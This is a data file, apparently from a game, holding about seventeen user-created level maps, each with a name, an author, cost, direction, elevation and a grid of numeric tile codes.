maps.push({name="CLIMB ENDING",author="ZpLit",id="#1662954660",direction="forward",cost=126,elevation=-2,map=[0,0,0,0,0,0,0,94,7,2,2,7,94,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,7,127,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,3,3,5,5,5,5,0,0,0,0,0,0,0,0,0,0,5,45,9,9,9,9,9,9,45,5,0,0,0,0,0,0,0,0,0,0,5,5,15,15,15,15,15,15,5,5,0,0,0,0,0,0,0,0,0,0,5,5,15,15,15,3,15,15,5,5,0,0,0,0,0,0,0,0,0,0,5,45,15,24,24,24,24,15,45,5,0,0,0,0,0,0,0,0,0,0,5,5,15,24,100,1,24,15,5,5,0,0,0,0,0,0,0,0,0,0,5,5,15,24,1,1,24,15,5,5,0,0,0,0,0,0,0,0,0,0,5,45,15,24,24,24,24,15,45,5,0,0,0,0,0,0,0,0,0,0,5,5,15,15,15,15,15,15,5,5,0,0,0,0,0,0,0,0,0,0,5,46,5,5,47,47,5,5,46,5,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0]});
maps.push({name="Death From Above",author="ZpLit",id="#1662956858",direction="forward",cost=206,elevation=-2,map=[0,0,0,0,0,94,7,7,93,2,2,93,7,7,94,0,0,0,0,0,0,0,0,0,0,7,7,7,7,7,7,7,7,7,7,0,0,0,0,0,0,0,0,0,0,8,8,8,8,6,6,8,8,8,8,0,0,0,0,0,0,0,0,0,0,9,9,9,9,5,5,9,9,9,9,0,0,0,0,0,0,0,0,0,0,10,10,10,10,5,5,10,10,10,10,0,0,0,0,0,0,0,0,0,0,11,11,11,11,5,5,11,11,11,11,0,0,0,0,0,0,0,0,0,0,12,12,12,12,5,5,12,12,12,12,0,0,0,0,0,0,0,0,0,0,13,13,13,13,5,5,13,13,13,13,0,0,0,0,0,0,0,0,0,0,14,14,14,14,5,5,14,14,14,14,0,0,0,0,0,0,0,0,0,0,15,15,15,15,5,5,15,15,15,15,0,0,0,0,0,0,0,0,0,0,16,16,16,16,5,5,16,16,16,16,0,0,0,0,0,0,0,0,0,0,17,17,17,17,5,5,17,17,17,17,0,0,0,0,0,0,0,0,0,0,18,18,18,18,91,91,18,18,18,18,0,0,0,0,0,0,0,0,0,0,19,19,19,19,85,85,19,19,19,19,0,0,0,0,0,0,0,0,0,0,20,20,20,20,5,5,20,20,20,20,0,0,0,0,0,0,0,0,0,0,21,21,21,21,91,91,21,21,21,21,0,0,0,0,0,0,0,0,0,0,22,22,22,22,85,85,22,22,22,22,0,0,0,0,0,0,0,0,0,0,23,23,23,23,5,5,23,23,23,23,0,0,0,0,0,0,0,0,0,0,24,24,24,24,5,5,24,24,24,24,0,0,0,0,0,0,0,0,0,0,100,88,87,86,2,2,86,87,88,100,0,0,0,0,0]});
maps.push({name="Grab it and out",author="TF2 Pencil",id="#1662966027",direction="forward",cost=216,elevation=0,map=[0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,19,0,0,0,0,0,0,0,0,0,0,0,0,19,19,19,19,19,19,19,19,19,19,19,19,19,19,0,0,0,0,0,0,19,14,14,14,14,14,14,14,14,14,14,14,14,19,0,0,0,0,0,0,19,14,14,14,14,14,14,14,14,14,14,14,14,19,0,0,0,0,0,0,19,14,14,9,9,9,141,141,9,9,9,14,14,19,0,0,0,0,0,0,19,14,14,9,93,9,9,9,9,94,9,14,14,19,0,0,0,0,0,0,19,14,14,9,94,9,88,88,9,93,9,14,14,19,0,0,0,0,0,0,19,141,14,9,93,9,88,88,9,94,9,14,141,19,0,0,0,0,0,0,19,141,14,9,94,9,88,88,9,93,9,14,141,19,0,0,0,0,0,0,19,14,14,9,93,9,88,88,9,94,9,14,14,19,0,0,0,0,0,0,19,14,14,9,94,9,9,9,9,93,9,14,14,19,0,0,0,0,0,0,19,14,14,9,9,9,141,141,9,9,9,14,14,19,0,0,0,0,0,0,19,14,14,14,14,14,14,14,14,14,14,14,14,19,0,0,0,0,0,0,19,14,14,14,14,14,14,14,14,14,14,14,14,19,0,0,0,0,0,0,19,19,19,19,19,19,19,19,19,19,19,19,19,19,0,0,0,0,0,0,0,0,0,0,0,0,19,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0]});
maps.push({name="Trigger Tower 7",author="TF2 Pencil",id="#1662966083",direction="right",cost=276,elevation=19,map=[2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,0,5,5,1,33,31,29,27,25,25,5,5,5,5,3,3,3,14,1,0,0,5,5,1,35,0,0,0,0,1,105,105,1,0,0,0,0,14,1,0,0,5,5,1,37,0,97,43,43,1,105,105,1,24,24,97,0,3,1,0,0,5,5,1,39,0,0,0,41,1,105,105,1,3,0,0,0,3,1,0,0,5,5,1,39,0,0,39,39,1,105,105,1,3,3,3,3,3,1,0,0,5,5,1,1,1,1,1,1,1,105,105,1,1,1,1,1,1,1,0,0,5,5,105,105,105,105,105,105,105,105,105,105,105,5,96,5,3,24,24,2,5,5,105,105,105,105,105,105,105,105,105,105,105,5,96,5,3,24,24,2,0,0,1,1,1,1,1,1,1,105,105,1,1,1,1,1,1,1,0,0,0,0,1,54,55,56,57,58,1,105,105,1,125,39,39,0,125,1,0,0,0,0,1,53,0,44,58,58,1,105,105,1,0,0,0,0,34,1,0,0,0,0,1,52,0,97,0,0,1,105,105,1,44,44,97,0,34,1,0,0,0,0,1,51,0,0,0,125,1,105,105,1,0,0,0,0,0,1,0,0,0,0,1,50,49,48,47,6,5,5,5,25,25,125,0,29,125,1,0,0,0,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Item Rooms",author="TF2 Pencil",id="#1662966246",direction="forward",cost=296,elevation=0,map=[0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,12,12,0,0,0,0,0,0,0,0,0,0,1,1,1,1,1,1,1,1,12,12,1,1,1,1,1,1,1,1,0,0,1,93,12,1,12,12,12,12,12,12,12,12,12,12,12,12,12,1,0,0,1,12,12,12,12,12,12,12,12,12,12,12,12,12,1,12,93,1,0,0,1,1,1,1,12,1,1,1,1,1,1,1,1,12,1,1,1,1,0,0,1,94,12,1,12,12,12,12,1,1,88,94,1,12,12,12,12,1,0,0,1,12,12,12,12,1,94,88,1,1,12,12,12,12,1,12,94,1,0,0,1,1,1,1,12,1,1,1,1,1,1,1,1,12,1,1,1,1,0,0,1,93,12,1,12,12,12,12,1,1,88,93,1,12,12,12,12,1,0,0,1,12,12,12,12,1,93,88,1,1,12,12,12,12,1,12,93,1,0,0,1,1,1,1,12,1,1,1,1,1,1,1,1,12,1,1,1,1,0,0,1,94,12,1,12,12,12,12,1,1,88,94,1,12,12,12,12,1,0,0,1,12,12,12,12,1,94,88,1,1,12,12,12,12,1,12,94,1,0,0,1,1,1,1,12,1,1,1,1,1,1,1,1,12,1,1,1,1,0,0,1,93,12,1,12,12,12,12,12,12,12,12,12,12,12,12,12,1,0,0,1,12,12,12,12,12,12,12,12,12,12,12,12,12,1,12,93,1,0,0,1,1,1,1,1,1,1,1,12,12,1,1,1,1,1,1,1,1,0,0,0,0,0,0,0,0,0,0,12,12,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0]});
maps.push({name="Can you see inside",author="TF2 Pencil",id="#1662966324",direction="left",cost=346,elevation=15,map=[0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,0,0,0,0,9,9,9,9,9,9,9,9,9,9,9,9,9,9,3,3,0,2,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,0,2,24,24,0,144,144,144,144,144,144,144,144,144,144,144,144,0,14,14,0,0,24,24,0,144,0,0,0,0,0,0,0,0,0,0,144,0,14,14,0,0,24,24,0,144,0,0,0,0,0,0,0,0,0,0,144,0,14,14,0,0,24,24,0,144,0,0,34,34,34,34,34,34,0,0,144,0,14,14,0,0,24,24,0,144,0,0,34,59,59,59,59,34,0,0,144,0,14,14,0,0,24,24,0,144,0,0,34,59,1,1,59,34,0,0,144,0,14,14,0,0,24,24,0,144,0,0,34,59,1,1,59,34,0,0,144,0,14,14,0,0,24,24,0,144,0,0,34,59,59,59,59,34,0,0,144,0,14,14,0,0,24,24,0,144,0,0,34,34,34,34,34,34,0,0,144,0,14,14,0,0,24,24,0,144,0,0,0,0,0,0,0,0,0,0,144,0,14,14,0,0,24,24,0,144,0,0,0,0,0,0,0,0,0,0,144,0,14,14,0,0,24,24,0,144,144,144,144,144,144,144,144,144,144,144,144,0,14,14,0,0,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,0,0,141,141,19,19,19,19,19,19,19,19,19,19,19,19,19,19,3,14,0,0,19,19,19,19,19,19,19,19,19,19,19,19,19,19,19,19,3,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Is this art",author="TF2 Pencil",id="#1662966453",direction="right",cost=352,elevation=-18,map=[0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,0,0,0,0,0,0,0,0,0,0,0,0,6,6,6,2,0,0,24,24,0,0,0,0,0,0,0,0,0,0,0,0,6,6,6,2,0,0,24,24,0,0,0,0,0,0,0,0,0,0,0,0,6,6,0,0,0,0,24,24,0,0,0,0,0,0,0,0,0,0,0,0,6,6,0,0,0,0,24,24,0,0,144,144,144,144,144,144,144,144,0,0,6,6,0,0,0,0,23,23,0,0,144,144,144,144,144,144,144,144,0,0,6,6,0,0,0,0,22,22,0,0,144,144,144,144,144,144,144,144,0,0,6,6,0,0,0,0,21,21,0,0,144,144,144,144,144,144,144,144,0,0,6,6,0,0,0,0,20,20,0,0,144,144,144,144,144,144,144,144,0,0,6,6,0,0,0,0,19,19,0,0,144,144,144,144,144,144,144,144,0,0,6,6,0,0,0,0,18,18,0,0,144,144,144,144,144,144,144,144,0,0,6,6,0,0,0,0,17,17,0,0,144,144,144,144,144,144,144,144,0,0,6,6,0,0,0,0,16,16,0,0,0,0,0,0,0,0,0,0,0,0,6,6,0,0,0,0,15,15,0,0,0,0,0,0,0,0,0,0,0,0,6,6,0,0,0,0,14,14,14,14,14,14,14,13,12,11,10,9,8,7,6,6,0,0,0,0,14,14,14,14,14,14,14,13,12,11,10,9,8,7,6,6,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Box with RNG",author="TF2 Pencil",id="#1662966489",direction="forward",cost=670,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,14,14,1,0,0,1,144,144,144,144,144,144,144,144,144,144,144,144,144,144,14,14,1,0,0,1,144,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,1,0,0,1,144,14,14,14,14,14,14,14,14,14,14,14,14,14,14,144,1,0,0,1,144,14,14,144,144,144,144,144,144,144,144,144,144,14,14,144,1,0,0,1,144,14,14,144,144,144,144,144,144,144,144,144,144,14,14,144,1,0,0,1,144,14,14,14,14,14,14,14,14,14,14,14,14,14,14,144,1,0,0,1,144,14,14,14,14,14,14,14,14,14,14,14,14,14,14,144,1,0,0,1,144,14,14,144,144,144,144,144,144,144,144,144,144,14,14,144,1,0,0,1,144,14,14,144,144,144,144,144,144,144,144,144,144,14,14,144,1,0,0,1,144,14,14,14,14,14,14,14,14,14,14,14,14,14,14,144,1,0,0,1,144,14,14,14,14,14,14,14,14,14,14,14,14,14,14,144,1,0,0,1,144,14,14,144,144,144,144,144,144,144,144,144,144,14,14,144,1,0,0,1,144,14,14,144,144,144,144,144,144,144,144,144,144,14,14,144,1,0,0,1,144,14,14,14,14,14,14,14,14,14,14,14,14,14,14,144,1,0,0,1,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,144,1,0,0,1,14,14,144,144,144,144,144,144,144,144,144,144,144,144,144,144,1,0,0,1,14,14,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Crowded Rooms 12",author="TF2 Pencil",id="#1662966518",direction="forward",cost=402,elevation=17,map=[0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,1,1,1,1,1,1,1,5,5,1,1,1,1,1,1,1,0,0,0,0,1,144,144,144,144,1,144,5,5,144,1,144,144,144,144,1,0,0,0,29,109,9,9,9,8,7,6,5,5,6,7,8,9,9,9,109,29,0,0,29,109,9,9,9,8,7,6,5,5,6,7,8,9,9,9,109,29,0,0,0,1,144,10,10,144,1,144,144,144,144,1,144,10,10,144,1,0,0,0,29,1,1,11,11,1,1,1,1,1,1,1,1,11,11,1,1,29,0,0,29,1,144,12,12,0,1,0,0,0,0,1,0,12,12,144,1,29,0,0,100,1,144,13,13,0,1,0,94,93,0,1,0,13,13,144,1,100,0,0,0,1,144,14,14,0,34,36,38,38,36,34,0,14,14,144,1,0,0,0,0,1,144,15,15,0,1,0,0,0,0,1,0,15,15,144,1,0,0,0,0,1,1,16,16,1,1,1,1,1,1,1,1,16,16,1,1,0,0,0,0,1,144,17,17,144,1,144,144,144,144,1,144,17,17,144,1,0,0,0,38,118,18,18,18,19,20,21,22,22,21,20,19,18,18,18,118,38,0,0,38,118,18,18,18,19,20,21,22,22,21,20,19,18,18,18,118,38,0,0,0,1,144,144,144,144,1,144,22,22,144,1,144,144,144,144,1,0,0,0,38,1,1,1,1,1,1,1,22,22,1,1,1,1,1,1,1,38,0,0,0,38,100,0,0,0,0,0,22,22,0,0,0,0,0,100,38,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0]});
maps.push({name="Avoid RNG Room",author="TF2 Pencil",id="#1662966559",direction="right",cost=628,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,0,0,0,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,0,0,0,14,1,1,1,1,1,1,1,1,1,1,1,1,1,9,9,9,0,0,0,14,1,132,18,144,144,144,144,144,144,144,144,144,1,9,14,14,0,0,0,14,1,18,18,144,144,144,144,144,144,144,144,144,1,131,9,9,0,0,0,14,1,18,144,144,144,144,144,144,144,144,144,144,1,9,14,14,0,0,0,14,1,18,144,144,144,144,144,144,144,144,144,144,1,131,9,9,0,0,0,14,1,18,144,144,144,144,144,144,144,144,144,144,1,9,14,14,0,0,0,14,1,18,144,144,144,144,144,144,144,144,144,144,1,131,9,9,0,0,0,14,1,18,144,144,144,144,144,144,144,144,144,144,1,9,14,14,0,0,0,14,1,18,144,144,144,144,144,144,144,144,144,144,1,9,9,9,0,0,0,14,1,18,144,144,144,144,144,144,144,144,144,144,1,131,9,9,0,0,0,14,1,18,18,144,144,144,144,144,144,144,144,144,1,9,14,14,0,0,0,14,1,96,18,144,144,144,144,144,144,144,144,144,1,9,9,9,0,0,0,14,1,118,1,1,1,1,1,1,1,1,118,118,1,9,9,9,0,0,0,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,2,0,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,97,14,14,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Can you go up",author="TF2 Pencil",id="#1662966630",direction="left",cost=512,elevation=15,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,0,0,24,24,24,140,140,140,19,19,140,140,140,14,14,140,140,140,9,9,0,0,24,24,24,140,140,140,19,19,140,140,140,14,14,140,140,140,9,9,0,0,24,24,24,140,140,140,19,19,140,140,140,14,14,140,140,140,9,9,0,0,24,24,24,140,140,140,19,19,140,140,140,14,14,140,140,140,9,9,0,0,24,24,24,140,140,140,19,19,140,140,140,14,14,140,140,140,9,9,0,0,24,24,24,140,140,140,19,19,140,140,140,14,14,140,140,140,9,9,0,2,24,24,24,140,140,140,19,19,140,140,140,14,14,140,140,140,9,9,0,2,24,24,24,140,140,140,19,19,140,140,140,14,14,140,140,140,9,9,0,0,24,24,24,140,140,140,19,19,140,140,140,14,14,140,140,140,9,9,0,0,24,24,24,140,140,140,19,19,140,140,140,14,14,140,140,140,9,9,0,0,24,24,24,140,140,140,19,19,140,140,140,14,14,140,140,140,9,9,0,0,24,24,24,140,140,140,19,19,140,140,140,14,14,140,140,140,9,9,0,0,24,24,24,140,140,140,19,19,140,140,140,14,14,140,140,140,9,9,0,0,24,24,24,140,140,140,19,19,140,140,140,14,14,140,140,140,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Grab and go",author="TF2 Pencil",id="#1662966654",direction="left",cost=140,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,16,16,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,16,16,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,16,16,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,16,16,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,16,16,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,16,16,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,16,16,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,16,16,0,0,0,0,2,16,16,16,16,16,16,18,18,18,18,18,18,18,18,18,18,0,0,0,2,16,16,16,16,16,16,18,1,1,143,1,1,143,1,1,18,0,0,0,0,0,0,0,0,0,0,18,1,118,118,118,118,118,118,1,18,0,0,0,0,0,0,0,0,0,0,18,143,118,93,94,94,93,118,143,18,0,0,0,0,0,0,0,0,0,0,18,1,118,94,93,93,94,118,1,18,0,0,0,0,0,0,0,0,0,0,18,1,118,94,93,93,94,118,1,18,0,0,0,0,0,0,0,0,0,0,18,143,118,93,94,94,93,118,143,18,0,0,0,0,0,0,0,0,0,0,18,1,118,118,118,118,118,118,1,18,0,0,0,0,0,0,0,0,0,0,18,1,1,143,1,1,143,1,1,18,0,0,0,0,0,0,0,0,0,0,18,18,18,18,18,18,18,18,18,18,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Need Two Floors 8",author="TF2 Pencil",id="#1662966684",direction="right",cost=321,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,13,13,0,0,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,13,13,0,0,0,1,132,113,53,142,142,13,96,13,142,142,142,142,142,142,13,13,0,0,0,1,113,113,53,142,142,13,96,13,142,142,142,142,142,142,125,13,0,0,0,1,99,113,1,20,20,1,1,1,1,1,1,1,1,1,13,13,0,0,0,1,113,113,1,40,40,0,40,0,40,93,0,1,131,113,98,98,0,0,0,1,113,113,1,40,40,0,40,0,97,40,0,1,113,113,98,98,0,0,0,1,53,53,1,98,98,0,0,0,0,0,0,1,1,1,1,1,0,0,0,1,142,142,20,40,0,0,0,0,0,0,0,1,102,40,0,1,0,0,0,1,142,142,1,0,0,0,0,0,0,0,0,1,0,0,13,13,0,0,0,1,142,142,1,1,1,1,1,1,1,1,1,1,40,40,1,13,0,0,0,1,142,142,1,0,0,0,0,0,0,0,0,0,0,0,1,103,0,0,0,1,142,142,40,0,40,0,40,0,40,0,40,0,40,40,1,103,0,0,0,1,13,13,1,0,0,0,0,0,0,0,0,0,0,0,1,13,0,0,0,1,13,13,1,1,1,1,1,1,1,1,1,1,1,1,1,13,0,0,0,1,13,13,1,125,142,142,142,142,142,142,13,13,104,13,103,13,13,2,0,1,13,13,101,13,142,142,142,142,142,142,13,13,13,13,103,13,13,2,0,1,1,1,1,1,1,20,20,20,20,1,1,1,1,1,1,1,0,0,0,0,0,0,0,0,1,93,94,93,94,1,0,0,0,0,0,0,0,0]});
maps.push({name="Square Pizza",author="TF2 Pencil",id="#1662966815",direction="forward",cost=216,elevation=0,map=[0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,13,13,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,13,13,0,0,0,0,0,0,0,0,0,0,0,0,13,13,13,13,13,13,13,13,13,13,13,13,13,13,0,0,0,0,0,0,13,35,35,35,35,35,35,35,35,35,35,35,35,13,0,0,0,0,0,0,13,35,55,55,55,55,55,55,55,55,55,55,35,13,0,0,0,0,0,0,13,35,55,115,55,115,55,55,115,55,115,55,35,13,0,0,0,0,0,0,13,35,55,55,125,55,55,55,55,125,55,55,35,13,0,0,0,0,0,0,13,35,55,115,55,115,55,55,115,55,115,55,35,13,0,0,0,0,0,0,13,35,55,55,55,55,55,55,55,55,55,55,35,13,0,0,0,0,0,0,13,35,55,55,55,55,55,55,55,55,55,55,35,13,0,0,0,0,0,0,13,35,55,115,55,115,55,55,115,55,115,55,35,13,0,0,0,0,0,0,13,35,55,55,125,55,55,55,55,125,55,55,35,13,0,0,0,0,0,0,13,35,55,115,55,115,55,55,115,55,115,55,35,13,0,0,0,0,0,0,13,35,55,55,55,55,55,55,55,55,55,55,35,13,0,0,0,0,0,0,13,35,35,35,35,35,35,35,35,35,35,35,35,13,0,0,0,0,0,0,13,13,13,13,13,13,13,13,13,13,13,13,13,13,0,0,0,0,0,0,0,0,0,0,0,0,13,13,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,13,13,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0]});
maps.push({name="Stupid 5",author="TF2 Pencil",id="#1662966837",direction="forward",cost=474,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,0,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,14,14,0,0,14,14,66,73,73,73,73,73,73,73,73,73,73,73,73,66,14,14,0,0,131,14,66,73,73,73,73,73,73,73,73,73,73,73,73,66,14,14,0,0,14,14,66,1,1,1,1,1,1,1,1,1,1,1,1,66,14,14,0,0,14,14,66,73,73,73,73,73,73,73,73,73,73,73,73,66,14,14,0,0,131,14,66,73,73,73,73,73,73,73,73,73,73,73,73,66,14,14,0,0,14,14,66,1,1,1,1,1,1,1,1,1,1,1,1,66,14,14,0,0,14,14,66,73,73,73,73,73,73,73,73,73,73,73,73,66,14,14,0,0,131,14,66,73,73,73,73,73,73,73,73,73,73,73,73,66,14,14,0,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,66,14,14,0,0,14,14,66,73,73,73,73,73,73,73,73,73,73,73,73,66,14,14,0,0,14,14,66,73,73,73,73,73,73,73,73,73,73,73,73,66,14,14,0,0,14,14,1,1,1,1,1,1,1,1,1,1,1,1,1,1,14,14,0,0,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,14,132,14,0,0,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="JustGoUpWithRandom",author="TF2 Pencil",id="#1662966964",direction="left",cost=336,elevation=18,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,6,6,0,0,0,0,0,144,144,144,144,144,144,144,144,144,144,144,0,0,6,6,0,0,0,39,39,39,39,39,39,39,39,39,39,39,39,144,0,0,7,7,0,0,0,39,39,144,144,144,144,144,144,144,144,39,39,144,0,0,8,8,0,0,0,39,39,39,39,39,39,39,39,39,39,39,39,144,0,0,9,9,0,0,0,40,40,144,144,144,144,144,144,144,144,0,0,144,0,0,0,0,0,0,0,41,41,0,0,0,0,0,0,0,144,39,39,144,0,0,29,29,0,0,0,42,42,0,0,0,0,0,0,0,144,38,38,144,0,0,29,29,0,0,0,43,43,0,0,0,0,0,0,0,144,37,37,144,0,0,0,0,0,0,0,44,44,0,0,0,0,0,0,0,144,36,36,144,0,0,29,29,0,0,0,44,44,0,0,0,0,0,0,0,144,35,35,144,0,0,29,29,0,0,0,0,0,0,0,0,0,0,0,0,144,34,34,144,0,0,0,0,0,0,0,24,24,0,0,0,0,0,0,0,144,33,33,144,0,0,29,29,0,0,0,24,24,0,0,0,0,0,0,0,144,32,32,144,0,0,29,29,0,0,0,24,24,0,0,0,0,0,0,0,144,31,31,144,144,0,0,0,0,0,0,24,24,0,0,0,0,0,0,0,144,30,30,30,30,0,29,29,0,0,2,24,24,0,0,0,0,0,0,0,144,30,30,30,30,0,29,29,0,0,2,24,24,0,0,0,0,0,0,0,144,144,144,144,144,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="My Boobs",author="Shellbert",id="#1663008025",direction="forward",cost=591,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,2,2,1,0,0,0,0,0,0,0,1,1,1,1,0,0,0,0,0,1,64,64,1,0,0,0,0,0,1,1,1,74,73,1,1,0,0,1,1,64,64,62,1,0,0,0,0,1,1,72,74,73,71,73,1,1,1,1,1,64,62,1,0,0,0,0,1,1,72,74,74,74,73,74,1,1,64,64,64,62,1,0,0,0,0,0,1,72,74,74,74,74,74,74,1,1,1,1,64,62,1,0,0,0,0,1,1,74,74,74,74,74,74,74,1,70,70,1,54,1,0,0,0,0,1,1,74,74,74,74,74,74,74,1,1,70,70,70,74,1,1,0,0,1,1,1,74,74,74,74,1,1,1,1,1,70,70,70,74,74,1,1,0,64,64,1,1,74,1,1,1,72,74,74,1,1,70,74,74,74,74,1,1,64,64,64,1,74,1,72,72,74,74,73,74,1,1,70,74,74,74,72,1,64,62,1,1,74,72,74,74,74,73,71,73,1,70,70,70,74,72,72,1,62,62,1,74,74,72,74,74,74,74,73,74,1,1,70,70,74,74,72,1,1,1,74,74,74,74,74,74,74,74,74,74,1,1,70,70,74,74,72,1,0,0,1,1,74,74,74,74,74,74,74,1,1,70,70,70,74,74,72,1,0,0,0,1,1,1,74,74,74,74,1,1,1,70,70,70,70,70,72,1,0,0,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,72,1,0,0,0,1,64,64,64,62,62,91,22,22,22,22,22,22,1,1,72,1,0,0,0,0,1,64,64,64,62,1,1,0,0,0,0,0,22,1,66,1,0,0,0,0,0,1,2,2,62,62,1,1,0,0,0,0,3,14,14,1]});
